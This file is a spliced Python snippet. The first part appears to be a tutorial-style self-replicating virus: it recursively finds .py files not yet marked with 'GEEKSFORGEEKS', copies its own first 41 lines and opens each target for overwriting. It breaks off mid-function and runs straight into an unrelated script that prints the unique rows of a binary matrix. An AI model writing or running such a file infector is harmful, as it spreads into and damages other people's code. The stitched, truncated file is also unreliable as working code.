#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 code to print unique row in a
# given binary matrix
 
def printArray(matrix):
 
    rowCount = len(matrix)
    if rowCount == 0:
        return
 
    columnCount = len(matrix[0])
    if columnCount == 0:
        return
 
    row_output_format = " ".join(["%s"] * columnCount)
 
    printed = {}
 
    for row in matrix:
        routput = row_output_format % tuple(row)
        if routput not in printed:
            printed[routput] = True
            print(routput)
 
# Driver Code
mat = [[0, 1, 0, 0, 1],
       [1, 0, 1, 1, 0],
       [0, 1, 0, 0, 1],
       [1, 1, 1, 0, 0]]
 
printArray(mat)
 
# This code is contributed by myronwalker
# Time Complexity: O(ROW x Col) - To Traverse the matrix and insert in the HashSet 
# Space Complexity: O(Row) - to store the hashset O(Row x Col)